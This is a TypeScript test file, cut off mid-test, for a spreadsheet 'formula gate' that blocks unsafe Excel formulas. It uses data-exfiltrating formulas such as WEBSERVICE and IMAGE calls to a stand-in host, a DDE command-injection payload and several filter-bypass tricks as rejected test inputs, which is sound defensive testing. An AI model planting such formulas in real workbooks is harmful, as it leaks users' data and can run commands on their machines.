import { describe, expect, it } from "vitest";
import { EXCLUDED } from "../src/core/allowlist";
import { check, checkFill, FormulaParseError, tokenize, type GateContext } from "../src/core/formulaGate";
import { normalizeFunctionName } from "../src/core/allowlist";
import type { GateCode, GateResult } from "../src/core/types";

const base: GateContext = {
  sheet: "Orders",
  sheets: ["Orders", "Regions"],
  tableNames: [],
  tables: [],
  allowedRanges: ["Orders!A1:F501"],
};

const withTable: GateContext = {
  ...base,
  tableNames: ["Orders"],
  tables: [{ name: "Orders", sheet: "Orders", address: "A1:F501" }],
};

const withRegions: GateContext = { ...base, allowedRanges: ["Orders!A1:F501", "Regions!A1:B5"] };

function codes(r: GateResult): GateCode[] {
  return r.reasons.map((x) => x.code);
}

function allowed(formula: string, ctx: GateContext = base): void {
  const r = check(formula, ctx);
  expect(r, formula).toEqual({ ok: true, reasons: [] });
}

function rejected(formula: string, expected: GateCode[] = [], ctx: GateContext = base): GateResult {
  const r = check(formula, ctx);
  expect(r.ok, formula).toBe(false);
  expect(r.reasons.length, formula).toBeGreaterThan(0);
  for (const code of expected) expect(codes(r), formula).toContain(code);
  return r;
}

describe("spec §10 formula gate table", () => {
  it('T-G1: rejects =WEBSERVICE("https://x.test/?d="&A2) (G-FUNC, G-URL)', () => {
    const r = rejected('=WEBSERVICE("https://x.test/?d="&A2)', ["G-FUNC", "G-URL"]);
    expect(r.reasons).toContainEqual({ code: "G-FUNC", detail: "Uses WEBSERVICE, which can send data over the internet." });
  });

  it('T-G2: rejects =IFERROR(WEBSERVICE(A2),"") (nested call found)', () => {
    rejected('=IFERROR(WEBSERVICE(A2),"")', ["G-FUNC"]);
  });

  it("T-G3: rejects = webservice ( A2 ) (case and spacing)", () => {
    rejected("= webservice ( A2 )", ["G-FUNC"]);
  });

  it('T-G4: rejects =_xlfn.IMAGE("https://x.test/"&A2) after prefix strip', () => {
    const r = rejected('=_xlfn.IMAGE("https://x.test/"&A2)', ["G-FUNC"]);
    expect(r.reasons.find((x) => x.code === "G-FUNC")?.detail).toContain("IMAGE");
  });

  it('T-G5: rejects =HYPERLINK("https://x.test/?"&A2,"x")', () => {
    rejected('=HYPERLINK("https://x.test/?"&A2,"x")', ["G-FUNC"]);
  });

  it("T-G6: rejects =SUM('[Book2.xlsx]Sheet1'!A1:A9) (G-EXT)", () => {
    rejected("=SUM('[Book2.xlsx]Sheet1'!A1:A9)", ["G-EXT"]);
  });

  it("T-G7: rejects =MyLambda(A2) with MyLambda a workbook name (G-FUNC)", () => {
    const r = rejected("=MyLambda(A2)", ["G-FUNC"]);
    expect(r.reasons[0]?.detail).toBe("Uses MyLambda, which isn't on the list of allowed functions.");
  });

  it("T-G8: rejects =SecretName (G-NAME)", () => {
    rejected("=SecretName", ["G-NAME"]);
  });

  it('T-G9: rejects =INDIRECT("A"&B2)', () => {
    rejected('=INDIRECT("A"&B2)', ["G-FUNC"]);
  });

  it("T-G10: rejects =WEBSERVІCE(A2) with a Cyrillic І (not on the allowlist)", () => {
    const f = "=WEBSERV\u0406CE(A2)";
    const r = rejected(f, ["G-FUNC"]);
    expect(codes(r)).not.toContain("G-PARSE");
  });

  it('T-G11: rejects =COPILOT("summarize",A2:A9)', () => {
    rejected('=COPILOT("summarize",A2:A9)', ["G-FUNC"]);
  });

  it('T-G12: rejects =A2&"https://x.test" (G-URL)', () => {
    rejected('=A2&"https://x.test"', ["G-URL"]);
  });

  it("T-G13: allows =LET(x,A2,f,LAMBDA(v,v*2),f(x))", () => {
    allowed("=LET(x,A2,f,LAMBDA(v,v*2),f(x))");
  });

  it("T-G14: allows =SUMIFS(E2:E501,B2:B501,B2:B501)", () => {
    allowed("=SUMIFS(E2:E501,B2:B501,B2:B501)");
  });

  it('T-G15: allows =IF(A2="WEBSERVICE(","yes","no") (text inside a string is not a call)', () => {
    allowed('=IF(A2="WEBSERVICE(","yes","no")');
  });

  it("T-G16: allows =Orders[Amount]*2 with table Orders; rejects without it", () => {
    allowed("=Orders[Amount]*2", withTable);
    rejected("=Orders[Amount]*2", ["G-EXT"], base);
  });

  it("T-G17: rejects =SUM(Z1:Z5000) with selection A1:F501 (G-REF)", () => {
    const r = rejected("=SUM(Z1:Z5000)", ["G-REF"]);
    expect(r.reasons).toEqual([{ code: "G-REF", detail: "Refers to Z1:Z5000, outside the ranges you chose." }]);
  });

  it("T-G18: allows =SUMIFS(E:E,B:B,B2) with columns B and E selected", () => {
    allowed("=SUMIFS(E:E,B:B,B2)");
    allowed("=SUMIFS(E:E,B:B,B2)", { ...base, allowedRanges: ["Orders!B1:B501", "Orders!E1:E501"] });
    rejected("=SUMIFS(E:E,B:B,B2)", ["G-REF"], { ...base, allowedRanges: ["Orders!B1:B501"] });
    rejected("=SUM(G:G)", ["G-REF"]);
    rejected("=SUM(A:G)", ["G-REF"]);
  });

  it("T-G19: allows =XLOOKUP(B2,Regions!A2:A5,Regions!B2:B5) with Regions!A1:B5 added as context; rejects without", () => {
    allowed("=XLOOKUP(B2,Regions!A2:A5,Regions!B2:B5)", withRegions);
    rejected("=XLOOKUP(B2,Regions!A2:A5,Regions!B2:B5)", ["G-REF"], base);
  });
});

describe("excluded functions", () => {
  for (const name of EXCLUDED) {
    it(`rejects ${name} as written, with _xlfn. and in lower case`, () => {
      for (const f of [`=${name}(A2)`, `=_xlfn.${name}(A2)`, `=${name.toLowerCase()}(A2)`, `=_xlws.${name.toLowerCase()}(A2)`]) {
        const r = rejected(f, ["G-FUNC"]);
        const detail = r.reasons.find((x) => x.code === "G-FUNC")?.detail ?? "";
        expect(detail).toContain(name);
        expect(detail).toMatch(/^Uses .+, which .+\.$/);
      }
    });
  }

  it("rejects an excluded function nested deep inside allowed ones", () => {
    rejected('=IF(A2>0,SUM(E2:E9,LEN(TEXTJOIN(",",TRUE,cube' + 'value(A2)))),0)', ["G-FUNC"]);
    rejected("=LET(x,A2,IFERROR(OFFSET(A2,1,0),x))", ["G-FUNC"]);
    rejected("=@INDIRECT(A2)", ["G-FUNC"]);
    rejected("=SUM(\nINDIRECT\n(A2))", ["G-FUNC"]);
  });

  it("rejects functions that aren't on the allowlist even when harmless", () => {
    rejected("=TRANSPOSE(A2:B5)", ["G-FUNC"]);
    rejected("=_xludf.SUM(A2)", ["G-FUNC"]);
    rejected("=A1(2)", ["G-FUNC"]);
  });

  it("allows every allowlisted function name, with prefixes and in lower case", () => {
    allowed("=SUM(A2:A9)");
    allowed("=_xlfn.XLOOKUP(B2,A2:A9,E2:E9)");
    allowed("=_xlfn._xlws.SORT(A2:A9)");
    allowed("=ceiling.math(E2,10)");
    allowed("=LOG10(E2)");
    allowed("=TRUE()");
    allowed("=IF(TRUE,FALSE,true)");
  });
});

describe("G-START and G-LEN", () => {
  it("rejects anything that doesn't start with =", () => {
    for (const f of ["SUM(A2:A9)", " =SUM(A2:A9)", "", "+A2", "'=A2"]) rejected(f, ["G-START"]);
  });

  it("allows 2,000 characters and rejects 2,001", () => {
    const f2000 = "=1" + "+1".repeat(999);
    expect(f2000).toHaveLength(2000);
    allowed(f2000);
    const f2001 = f2000 + "0";
    expect(f2001).toHaveLength(2001);
    const r = rejected(f2001, ["G-LEN"]);
    expect(r.reasons[0]?.detail).toBe("This formula is longer than 2,000 characters.");
  });

  it("never reports the exact length, which after restore would reveal a private value's length", () => {
    const long = '=IF(A2="' + "x".repeat(2345) + '",1,0)';
    const r = rejected(long, ["G-LEN"]);
    expect(r.reasons).toEqual(rejected("=1" + "+1".repeat(1500), ["G-LEN"]).reasons);
    for (const reason of r.reasons) expect(reason.detail).not.toMatch(/2,?35\d/);
  });

  it("rejects very long input without reading it", () => {
    rejected("=" + "(".repeat(100000), ["G-LEN"]);
  });
});

describe("G-PARSE", () => {
  const cases: [string, string][] = [
    ["unterminated string", '="abc'],
    ["unterminated string after a call", '=IF(A2="x,1,2)'],
    ["unbalanced parens (open)", "=SUM(A1"],
    ["unbalanced parens (close)", "=SUM(A1))"],
    ["lone open paren", "=("],
    ["lone close paren", "=)"],
    ["empty parens as a value", "=()"],
    ["stray pipe (DDE)", "=cmd|' /C calc'!A0"],
    ["stray tilde", "=A1~B1"],
    ["stray backtick", "=A1`"],
    ["stray semicolon", "=SUM(A1;A2)"],
    ["non-breaking space", "=SUM(A1)\u00A0+1"],
    ["zero-width space in a name", "=WEB\u200BSERVICE(A2)"],
    ["fullwidth parenthesis", "=SUM\uFF08A1)"],
    ["empty after =", "="],
    ["only spaces after =", "=   "],
    ["unbalanced brace", "={1,2"],
    ["nested array", "={1,{2}}"],
    ["reference in an array", "={A1,2}"],
    ["unbalanced bracket", "=Orders[Amount"],
    ["quote inside brackets", '=Orders["x"]'],
    ["unterminated quoted sheet", "='My Sheet"],
    ["quoted sheet without !", "='My Sheet'A1"],
    ["missing operand", "=1+"],
    ["two values side by side", "=1 2"],
    ["number glued to letters", "=2A1"],
    ["bad error literal", "=#FOO!"],
    ["double equals", "==A1"],
    ["space before range colon", "=A1 :B2"],
    ["trim-range dot operator", "=SUM(A2:.A9)"],
    ["dangling sheet prefix", "=Regions!"],
  ];
  for (const [label, f] of cases) {
    it(`rejects ${label}: ${JSON.stringify(f)}`, () => {
      const r = rejected(f, ["G-PARSE"]);
      expect(r.reasons[0]?.detail.startsWith("Couldn't read this formula.")).toBe(true);
    });
  }

  it("rejects nesting deeper than Excel allows", () => {
    rejected("=" + "(".repeat(200) + "1" + ")".repeat(200), ["G-PARSE"]);
    rejected("=" + "ABS(".repeat(120) + "1" + ")".repeat(120), ["G-PARSE"]);
  });

  it("reads long chains without overflowing", () => {
    allowed("=" + "-".repeat(1500) + "1");
    allowed("=1" + "&1".repeat(999));
  });

  it("tokenize throws FormulaParseError; check turns it into G-PARSE", () => {
    expect(() => tokenize('="abc')).toThrow(FormulaParseError);
    expect(() => tokenize("=SUM(A1")).toThrow(FormulaParseError);
    expect(check('="abc', base)).toEqual({
      ok: false,
      reasons: [{ code: "G-PARSE", detail: expect.stringMatching(/^Couldn't read this formula\./) }],
    });
  });

  it("accepts syntax Excel accepts", () => {
    allowed("=IF(A2,,1)");
    allowed("=XLOOKUP(B2,A2:A9,E2:E9,,0)");
    allowed("=SUM(A2:A9 B2:B9)");
    allowed("=SUM((A2:A9,C2:C9))");
    allowed("=--(A2>0)");
    allowed("=-E2^2");
    allowed("=E2*50%");
    allowed("=1.5E+3+.5+2e-3");
    allowed("={1,2;3,4}");
    allowed('={"a",TRUE;-1,#N/A}');
    allowed("=IFERROR(E2/0,#DIV/0!)");
    allowed("=A2<>B2");
    allowed("=A2<=B2");
    allowed("=A2>=B2");
    allowed('=A2&" "&B2');
    allowed("=@A2:A9");
    allowed("=SUM(\n  E2:E9\n)");
    allowed("=LAMBDA(x,x*2)(E2)");
    allowed("=(LAMBDA(x,x*2))(E2)");
    allowed("=ROW()");
    allowed("=NOW()");
  });
});

describe("G-NAME", () => {
  it("rejects bare names, including sheet-qualified ones", () => {
    const r = rejected("=SecretName*2", ["G-NAME"]);
    expect(r.reasons[0]?.detail).toContain("SecretName");
    rejected("=Regions!Rates", ["G-NAME"]);
    rejected("=SUM(Total)", ["G-NAME"]);
  });

  it("allows an allowed function passed by name (eta form), as GROUPBY and PIVOTBY are written", () => {
    allowed("=BYROW(A2:C5,SUM)");
    allowed("=GROUPBY(C2:C501,F2:F501,SUM)");
    allowed("=PIVOTBY(C2:C501,E2:E501,F2:F501,_xlfn.SUM)");
    allowed("=MAP(E2:E9,ABS)");
  });

  it("rejects an excluded function passed by name", () => {
    rejected("=MAP(A2:A9,WEBSERVICE)", ["G-FUNC"]);
    rejected("=BYROW(A2:C5,_xlfn.IMAGE)", ["G-FUNC"]);
    rejected("=MAP(A2:A9,INDIRECT)", ["G-FUNC"]);
  });

  it("rejects a function passed by name when a workbook name shadows it", () => {
    const named = { ...base, definedNames: ["Sum"] };
    rejected("=GROUPBY(C2:C501,F2:F501,SUM)", ["G-NAME"], named);
    rejected("=GROUPBY(C2:C501,F2:F501,SUM)", ["G-NAME"], { ...base, definedNames: ["Orders!SUM"] });
    allowed("=GROUPBY(C2:C501,F2:F501,SUM)", { ...base, definedNames: ["Other"] });
    // A call is unaffected: SUM( always means the function.
    allowed("=SUM(E2:E501)", named);
  });

  it("allows TRUE/FALSE, references, locals in scope and known tables", () => {
    allowed("=IF(A2,TRUE,FALSE)");
    allowed("=LET(total,SUM(E2:E501),total/2)");
    allowed("=ROWS(Orders)", withTable);
    allowed("=ROWS(orders)", withTable);
    rejected("=ROWS(Other)", ["G-NAME"], withTable);
  });

  it("rejects a local used outside its LET", () => {
    rejected("=LET(x,1,x)+x", ["G-NAME"]);
    rejected("=LET(x,x,x)", ["G-NAME"]);
    rejected("=LET(x,1,y)", ["G-NAME"]);
    rejected("=LAMBDA(v,v*2)(v)", ["G-NAME"]);
  });
});

describe("LET and LAMBDA locals", () => {
  it("allows common LET and LAMBDA shapes", () => {
    allowed("=LET(_xlpm.total,SUM(E2:E501),_xlpm.total*2)");
    allowed("=LET(_xlpm.total,SUM(E2:E501),total*2)");
    allowed("=MAP(A2:A5,LAMBDA(v,UPPER(v)))");
    allowed("=REDUCE(0,E2:E501,LAMBDA(acc,v,acc+v))");
    allowed("=LET(sq,LAMBDA(k,k*k),MAP(E2:E9,LAMBDA(v,sq(v))))");
    allowed("=LET(a,1,b,a+1,c,b*2,a+b+c)");
  });

  it("rejects a declared name with a prefix other than _xlpm. (only _xlpm. marks a local)", () => {
    const named: GateContext = { ...base, definedNames: ["MyLambda"] };
    // Red-team proof: these hid the workbook name MyLambda behind a LET name.
    for (const f of [
      "=LET(_xlfn.MyLambda,0,MyLambda(A2))",
      "=LET(_xlws.MyLambda,0,MyLambda(A2))",
      "=LET(_xlpm._xlpm.MyLambda,0,MyLambda(A2))",
      "=LET(_XLFN.MyLambda,0,MyLambda(A2))",
      "=LAMBDA(_xlfn.f,f(A2))(1)",
      "=LET(_xludf.MyLambda,0,_xludf.MyLambda(A2))",
    ]) {
      rejected(f, ["G-FUNC"], named);
    }
    // A local is used only by its plain or _xlpm. name; another prefix never reaches it.
    rejected("=LET(_xlpm.MyLambda,LAMBDA(v,v),_xlfn.MyLambda(A2))", ["G-FUNC"], named);
    rejected("=LET(total,1,_xlfn.total)", ["G-NAME"]);
    allowed("=LET(_xlpm.MyLambda,LAMBDA(v,v),MyLambda(A2))", named);
    allowed("=LET(_xlpm.x,A2,_xlpm.x+x)");
  });

  it("rejects a local that shadows an excluded function", () => {
    for (const f of [
      "=LET(WEBSERVICE,A2,WEBSERVICE(A2))",
      "=LAMBDA(indirect,indirect)(A2)",
      "=LET(_xlpm.image,A2,image)",
      "=LET(_xlfn.IMAGE,A2,1)",
      "=LAMBDA(x,copilot,x)(1,2)",
    ]) {
      rejected(f, ["G-FUNC"]);
    }
  });

  it("allows a local named like an allowed function (whichever Excel calls is allowed)", () => {
    allowed("=LET(n,COUNTA(A:A),SUM(A2:INDEX(A:A,n)))");
    allowed("=MAP(E2:E9,LAMBDA(value,value*2))");
    allowed("=LET(sum,A2:A9,sum)");
    allowed("=LET(Filter,A2,Filter)");
    const r = rejected("=LET(webservice,A2,webservice)", ["G-FUNC"]);
    expect(r.reasons).toHaveLength(1);
  });

  it("rejects a local called outside its scope, which would call a workbook name", () => {
    rejected("=LET(MyLambda,1,2)+MyLambda(A2)", ["G-FUNC"]);
    rejected("=LAMBDA(f,f(1))(1)+f(A2)", ["G-FUNC"]);
  });

  it("rejects declarations that aren't plain names", () => {
    rejected("=LET(A1,5,A1)", ["G-FUNC"]);
    rejected("=LET(x1,5,x1)", ["G-FUNC"]);
    rejected('=LET("x",5,1)', ["G-FUNC"]);
    rejected("=LET(,5,1)", ["G-FUNC"]);
    rejected("=LAMBDA(A2,A2)(1)", ["G-FUNC"]);
    rejected("=LAMBDA([x],1)(1)");
  });

  it("rejects LET and LAMBDA without a final calculation", () => {
    rejected("=LET(x,1)", ["G-FUNC"]);
    rejected("=LET(x,1,y,2)", ["G-FUNC"]);
    rejected("=LAMBDA()", ["G-FUNC"]);
    rejected("=LAMBDA(x,)(1)", ["G-FUNC"]);
  });
});

describe("G-EXT", () => {
  it("rejects external workbooks, 3D references and unknown sheets", () => {
    for (const f of [
      "=[1]Sheet1!A1",
      "=SUM([1]Sheet1!A1:A9)",
      "=SUM([Book2.xlsx]Sheet1!A1:A9)",
      "=[1]!Total",
      "='C:\\x\\[Book2.xlsx]Sheet1'!A1",
      "='https://x.test/[b.xlsx]S'!A1",
      "=Book2.xlsx!Total",
      "=SUM(Orders:Regions!A1)",
      "=SUM('Orders:Regions'!A1)",
      "=Summary!A1",
      "='My Sheet'!A1",
    ]) {
      rejected(f, ["G-EXT"]);
    }
  });

  it("allows quoted names of known sheets", () => {
    const ctx: GateContext = { ...base, sheets: ["Orders", "My Sheet", "It's"], allowedRanges: ["Orders!A1:F501", "'My Sheet'!A1:B5", "'It''s'!A1:A3"] };
    allowed("='My Sheet'!A2+'It''s'!A1", ctx);
    allowed("=orders!A2+'my sheet'!B5", ctx);
  });

  it("rejects a function called through a sheet or workbook prefix", () => {
    rejected("=Regions!SUM(A2)", ["G-FUNC"]);
    rejected("=Book2.xlsx!MyFunc(A2)", ["G-FUNC", "G-EXT"]);
  });
});

describe("G-REF", () => {
  it("resolves unqualified references to the active sheet", () => {
    allowed("=SUM(A1:F501)");
    allowed("=$A$2+$F$501");
    allowed("=Orders!A2");
    rejected("=A502", ["G-REF"]);
    rejected("=G2", ["G-REF"]);
    rejected("=Regions!A2", ["G-REF"]);
    rejected("=A2", ["G-REF"], { ...base, sheet: "Regions" });
  });

  it("rejects whole-row references", () => {
    for (const f of ["=SUM(1:1)", "=SUM($2:$3)", "=SUM(Orders!1:1)", "=ROW(1:5)"]) {
      const r = rejected(f, ["G-REF"]);
      expect(r.reasons[0]?.detail).toMatch(/whole row/);
    }
    rejected("=SUM(1:1)", ["G-REF"], { ...base, allowedRanges: ["Orders!A1:XFD1"] });
  });

  it("rejects spill references everywhere, since their size isn't known", () => {
    const r = rejected("=SUM(A2#)", ["G-REF"]);
    expect(r.reasons).toEqual([{ code: "G-REF", detail: "Uses the spill range of A2, whose size isn't known." }]);
    // Red-team proofs: the spill of an allowed anchor can reach any column or row.
    for (const f of ["=INDEX(A2#,1,20)", "=INDEX(A2#,700,1)", "=CHOOSECOLS(A2#,30)", "=TAKE(A2#,-1)", "=LET(x,A2#,SUM(x))", "=MAP(A2#,LAMBDA(v,v))"]) {
      rejected(f, ["G-REF"]);
    }
    for (const f of ["=Regions!A2#", "=INDEX(Regions!A2#,1,50)"]) {
      const q = rejected(f, ["G-REF"], withRegions);
      expect(q.reasons).toContainEqual({ code: "G-REF", detail: "Uses the spill range of Regions!A2, whose size isn't known." });
    }
    rejected("=SUM(Z2#)", ["G-REF"]);
    rejected("=SUM(A2#)", ["G-REF"], { ...base, allowedRanges: ["Orders!A:XFD"] });
  });

  it("allows a range that spans two adjacent allowed ranges", () => {
    allowed("=SUM(A1:D5)", { ...base, allowedRanges: ["Orders!A1:B5", "Orders!C1:D5"] });
    rejected("=SUM(A1:D6)", ["G-REF"], { ...base, allowedRanges: ["Orders!A1:B5", "Orders!C1:D5"] });
  });

  it("accepts allowed ranges given as whole columns", () => {
    allowed("=SUM(C2:C900)", { ...base, allowedRanges: ["Orders!A:C"] });
    allowed("=SUM(C:C)", { ...base, allowedRanges: ["Orders!A:C"] });
    rejected("=SUM(D2)", ["G-REF"], { ...base, allowedRanges: ["Orders!A:C"] });
  });

  it("checks the box built by the : operator", () => {
    const two: GateContext = { ...base, allowedRanges: ["Orders!A1:F501", "Orders!H1:I20"] };
    allowed("=SUM(H2:I20)", two);
    rejected("=SUM(A2:I20)", ["G-REF"], two);
    rejected("=SUM(A2:F2:I20)", ["G-REF"], two);
    rejected("=SUM(A2:INDEX(H:H,5))", ["G-REF"], two);
    rejected("=LET(r,H1:H5,SUM(A1:r))", ["G-REF"], two);
    rejected("=MAP(H1:H5,LAMBDA(c,SUM(A1:c)))", ["G-REF"], two);
    allowed("=SUM(A2:INDEX(F:F,501))");
    allowed("=LET(cnt,COUNTA(A:A),SUM(A2:INDEX(A:A,cnt)))");
    allowed("=MAP(E2:E10,LAMBDA(c,SUM(E2:c)))");
    rejected("=SUM(Orders!A2:Regions!B5)", ["G-REF"], withRegions);
    rejected("=SUM(A2:A5#)", ["G-REF"]);
  });

  it("names the reference in plain words", () => {
    const r = rejected("=SUM(Z1:Z5000)");
    expect(r.reasons[0]?.detail).toBe("Refers to Z1:Z5000, outside the ranges you chose.");
  });
});

describe("checkFill (fill-down)", () => {
  const small: GateContext = { ...base, allowedRanges: ["Orders!A1:C7"] };

  function fillAllowed(formula: string, ctx: GateContext, rowShift: number): void {
    expect(checkFill(formula, ctx, rowShift), `${formula} filled ${rowShift}`).toEqual({ ok: true, reasons: [] });
  }

  function fillRejected(formula: string, ctx: GateContext, rowShift: number): GateResult {
    const r = checkFill(formula, ctx, rowShift);
    expect(r.ok, `${formula} filled ${rowShift}`).toBe(false);
    expect(codes(r), `${formula} filled ${rowShift}`).toContain("G-REF");
    return r;
  }

  it("is check() when nothing is filled", () => {
    for (const f of ["=C7*2", "=WEBSERVICE(A2)", "=SUM(Z1:Z5000)", '="abc', "SUM(A1)"]) {
      expect(checkFill(f, base, 0)).toEqual(check(f, base));
      expect(checkFill(f, base, -3)).toEqual(check(f, base));
    }
  });

  it("rejects relative rows that leave the ranges when filled (red-team fill-down proofs)", () => {
    const cases: [string, GateContext, number][] = [
      ["=F501*2", withRegions, 499],
      ["=SUM(E2:E501)", withRegions, 499],
      ["=Regions!B5", withRegions, 499],
      ["=F501", withRegions, 500],
      ["=C7*2", small, 5],
      ["=C2/SUM(C2:C7)", small, 5],
      ["=RANK.EQ(C2,C2:C7)", small, 5],
      ["=C4/SUM(C4:C8)", { ...base, allowedRanges: ["Orders!A3:C8"] }, 4],
    ];
    for (const [f, ctx, shift] of cases) {
      expect(check(f, ctx).ok, f).toBe(true);
      fillRejected(f, ctx, shift);
    }
  });

  it("T-G19 lookup filled over 500 rows is rejected unless its lookup rows use $", () => {
    fillRejected("=XLOOKUP(B2,Regions!A2:A5,Regions!B2:B5)", withRegions, 499);
    fillAllowed("=XLOOKUP(B2,Regions!$A$2:$A$5,Regions!$B$2:$B$5)", withRegions, 499);
    fillAllowed("=XLOOKUP(B2,Regions!A$2:A$5,Regions!B$2:B$5)", withRegions, 499);
  });

  it("allows fills that stay inside the ranges", () => {
    fillAllowed("=C2*2", small, 5);
    fillAllowed("=SUM($E$2:$E$501)", base, 499);
    fillAllowed("=E2/SUM(E:E)", base, 499);
    fillAllowed("=E2/SUM(E$2:E$501)", base, 499);
    fillAllowed("=SUM($E$2:E2)", base, 499);
    fillAllowed("=IF(A2=A1,0,1)", base, 499);
    fillAllowed("=Orders[@Amount]*2", withTable, 499);
    fillAllowed("=LET(x,E2,x*2)", base, 499);
    allowed("=SUM(E2:E501)");
    fillRejected("=SUM(E2:E501)", base, 499);
  });

  it("names the first filled row that leaves the ranges, and the reference there", () => {
    expect(checkFill("=C7*2", small, 5).reasons).toEqual([
      { code: "G-REF", detail: "Filled down 1 row, it would refer to C8, outside the ranges you chose." },
    ]);
    expect(checkFill("=C2*2", small, 8).reasons).toEqual([
      { code: "G-REF", detail: "Filled down 6 rows, it would refer to C8, outside the ranges you chose." },
    ]);
    // A gap between two allowed ranges is found, even when the last filled row is back inside.
    const gap: GateContext = { ...base, allowedRanges: ["Orders!A1:A5", "Orders!A10:A20"] };
    expect(checkFill("=A4", gap, 8).reasons).toEqual([
      { code: "G-REF", detail: "Filled down 2 rows, it would refer to A6, outside the ranges you chose." },
    ]);
    expect(checkFill("=Regions!$A2:B3", withRegions, 499).reasons).toEqual([
      { code: "G-REF", detail: "Filled down 3 rows, it would refer to Regions!$A5:B6, outside the ranges you chose." },
    ]);
  });

  it("moves only row parts without $", () => {
    fillAllowed("=E$501", base, 499);
    fillAllowed("=$E$501", base, 499);
    fillRejected("=$E501", base, 1);
    fillRejected("=SUM(E$2:E501)", base, 1);
    fillAllowed("=SUM(E501:E$2)", base, 0);
    fillRejected("=SUM(E501:E$2)", base, 1);
    fillAllowed("=SUM(E2:E$501)", base, 499);
    fillRejected("=SUM(E2:E$501)", base, 500);
  });

  it("sweeps references inside LET and LAMBDA and the operands of the : operator", () => {
    fillRejected("=LET(x,E501,x*2)", base, 1);
    fillRejected("=MAP(E2:E501,LAMBDA(v,v*2))", base, 1);
    fillRejected("=SUM(E2:INDEX(E:E,501))", base, 500);
    // Each reference stays inside on its own, but the box the colon builds between them doesn't.
    const two: GateContext = { ...base, allowedRanges: ["Orders!A1:F501", "Orders!G1:I20"] };
    allowed("=LET(r,I$2,SUM(A2:r))", two);
    fillAllowed("=LET(r,I$2,SUM(A2:r))", two, 18);
    const r = fillRejected("=LET(r,I$2,SUM(A2:r))", two, 30);
    expect(r.reasons).toEqual([
      { code: "G-REF", detail: "When filled down, it builds a range with a colon that reaches outside the ranges you chose." },
    ]);
  });

  it("rejects a fill that runs past the last row of the sheet", () => {
    const cols: GateContext = { ...base, allowedRanges: ["Orders!A:F"] };
    fillAllowed("=A2", cols, 1048574);
    const r = fillRejected("=A2", cols, 1048575);
    expect(r.reasons).toEqual([
      { code: "G-REF", detail: "Filled down 1,048,575 rows, A2 would move past the last row of the sheet." },
    ]);
    fillRejected("=SUM(A2:A3)", cols, 1048574);
    fillRejected("=A2", cols, Infinity);
    fillRejected("=A1", cols, 5e9);
  });

  it("adds the sweep to the other rules' results", () => {
    const f = '=WEBSERVICE("https://x.test/?"&C7)';
    const plain = check(f, small);
    const filled = checkFill(f, small, 5);
    expect(filled.ok).toBe(false);
    expect(filled.reasons.slice(0, plain.reasons.length)).toEqual(plain.reasons);
    expect(codes(filled)).toEqual([...codes(plain), "G-REF"]);
    // A reference already outside is reported once, by the plain rule.
    expect(checkFill("=Z9", base, 10).reasons).toEqual(check("=Z9", base).reasons);
    expect(checkFill('="abc', base, 10)).toEqual(check('="abc', base));
  });

  it("fails closed when the distance isn't a number", () => {
    fillRejected("=C2*2", small, Number.NaN);
    fillRejected("=C2*2", small, "5" as unknown as number);
    fillRejected("=C2*2", small, 0.5);
  });

  it("agrees with checking every filled copy one by one", () => {
    // Excel's fill-down, as in the red-team proofs: row numbers without $ in references move by one per row.
    const copy = (f: string, k: number) =>
      tokenize(f)
        .map((t) => (t.type !== "ref" ? t.text : t.text.replace(/(\$?[A-Za-z]{1,3})(\$?)(\d+)/g, (m, c, fixed, r) => (fixed ? m : `${c}${Number(r) + k}`))))
        .join("");
    const ctx: GateContext = { ...base, allowedRanges: ["Orders!A1:C9", "Orders!A12:B20", "Orders!E:E", "Regions!A1:B5"] };
    const refs = ["A2", "$A2", "A$2", "B7", "C3:C9", "A$1:B4", "$A$12:A13", "E4", "D2", "Regions!B3", "Regions!A$1:A2", "E:E", "B19", "C9"];
    const shapes = [(a: string, b: string) => `=SUM(${a},${b})`, (a: string, b: string) => `=SUM(${a}:${b})`, (a: string, b: string) => `=LET(x,${a},SUM(x:${b}))`];
    const next = rng(5);
    for (let n = 0; n < 1500; n++) {
      const pick = () => refs[Math.floor(next() * refs.length)]!;
      const f = shapes[Math.floor(next() * shapes.length)]!(pick(), pick());
      const shift = Math.floor(next() * 25);
      let every = true;
      for (let k = 0; k <= shift; k++) every &&= check(copy(f, k), ctx).ok;
      expect(checkFill(f, ctx, shift).ok, `${f} filled ${shift}`).toBe(every);
    }
  });

  it("never throws", () => {
    const next = rng(99);
    const parts = ["A2", "$A2", "A$2", "E2:E501", "A:A", "1:1", "Regions!B5", "A2#", "SUM(", "LET(", "x", ",", ")", ":", "INDEX(", "+", "Orders[@Amount]", "'My Sheet'!A1"];
    const shifts = [0, 1, 5, 499, 1048575, -1, Number.NaN, Infinity, 0.5];
    for (let n = 0; n < 3000; n++) {
      let f = "=";
      const len = 1 + Math.floor(next() * 10);
      for (let i = 0; i < len; i++) f += parts[Math.floor(next() * parts.length)]!;
      const shift = shifts[Math.floor(next() * shifts.length)]!;
      let r: GateResult | undefined;
      expect(() => (r = checkFill(f, withTable, shift)), f).not.toThrow();
      if (r!.ok) expect(check(f, withTable).ok, f).toBe(true);
    }
  });
});

describe("structured references", () => {
  it("allows the usual forms on a table inside an allowed range", () => {
    for (const f of [
      "=Orders[Amount]",
      "=Orders[@Amount]*2",
      "=Orders[[#This Row],[Amount]]",
      "=SUM(Orders[#All])",
      "=ROWS(Orders[])",
      "=SUM(Orders[[Amount]:[Qty]])",
      "=Orders[@[Unit Price]]",
      "=SUM(Orders[[#Headers],[#Data],[Amount]])",
      "=orders[amount]",
      "=Orders[Price'#]",
      "=Orders[@]",
    ]) {
      allowed(f, withTable);
    }
  });

  it("rejects unknown tables and table-less references (G-EXT)", () => {
    rejected("=Other[Amount]", ["G-EXT"], withTable);
    rejected("=[@Amount]*2", ["G-EXT"], withTable);
    rejected("=SUM([Amount])", ["G-EXT"], withTable);
  });

  it("rejects tables outside the allowed ranges, or with no known location (G-REF)", () => {
    const ctx: GateContext = {
      ...base,
      tableNames: ["Orders", "Rates"],
      tables: [
        { name: "Orders", sheet: "Orders", address: "A1:F501" },
        { name: "Rates", sheet: "Regions", address: "A1:B5" },
      ],
    };
    rejected("=SUM(Rates[Rate])", ["G-REF"], ctx);
    allowed("=SUM(Rates[Rate])", { ...ctx, allowedRanges: ["Orders!A1:F501", "Regions!A1:B5"] });
    rejected("=Orders[Amount]", ["G-REF"], { ...base, tableNames: ["Orders"], tables: [] });
    rejected("=ROWS(Rates)", ["G-REF"], ctx);
  });

  it("rejects malformed structured references", () => {
    rejected("=Orders[[Amount]", ["G-PARSE"], withTable);
    rejected("=Orders[Amount]]", ["G-PARSE"], withTable);
